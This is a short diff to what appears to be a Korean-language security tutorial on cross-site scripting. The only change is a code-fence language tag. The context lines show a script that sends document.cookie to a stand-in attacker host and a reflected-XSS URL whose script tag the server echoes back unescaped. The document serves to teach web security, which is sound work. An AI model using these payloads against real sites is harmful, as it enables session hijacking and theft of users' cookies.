@@ -31,7 +31,7 @@ document.location = 'https://attacker.com/steal?c=' + document.cookie;
 
 악성 스크립트가 URL 파라미터 등 HTTP 요청에 포함되어 서버 응답에 그대로 반사된다. 서버에 저장되지 않으므로, 공격자가 악성 URL을 피해자에게 클릭하도록 유도해야 한다.
 
-```
+```text
 공격 URL: https://example.com/search?q=<script>stealCookie()</script>
 서버 응답: <p>검색 결과: <script>stealCookie()</script></p>
           ↑ 입력을 이스케이프 없이 HTML에 삽입
